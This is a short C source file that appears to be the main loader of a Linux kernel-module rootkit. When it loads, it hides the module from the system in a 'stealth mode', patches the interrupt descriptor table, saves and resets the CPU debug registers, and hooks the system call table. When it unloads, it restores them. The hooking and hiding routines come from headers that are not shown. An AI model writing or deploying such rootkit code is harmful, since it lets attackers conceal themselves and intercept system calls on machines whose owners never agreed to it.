#include "utils.h"
#include "core.h"
#include "syscall_table.h"
#include "module_hiding.h"
#include "hook.h"
#include "dr_breakpoints.h"

static int idt_patched;
static unsigned long old_dr[4];
static unsigned long old_dr6, old_dr7;

/* load the LKM */
static int __init module_t_load(void)
{
  int i;
  
  /* do the hiding process if in STEALTH MODE */
  if (STEALTH_MODE)
    do_hide_module();

  /* save old registers */
  for (i = 0; i < 4; i++)
	get_dr(i, &old_dr[i]);

  get_dr(6, &old_dr6);
  get_dr(7, &old_dr7);

  idt_patched = !patch_idt();
  if (!idt_patched)
	return 1;

  hook_syscall_table();

  return 0;
}

/* unload the LKM */
static void __exit module_t_unload(void)
{
  int i;
  
  if (idt_patched)
	unpatch_idt();

  /* restore old registers */
  for (i = 0; i < 4; i++)
	set_dr_on_each_cpu(i, old_dr[i]);

  set_dr_on_each_cpu(6, old_dr6);
  set_dr_on_each_cpu(7, old_dr7);
  
}

module_init(module_t_load);
module_exit(module_t_unload);
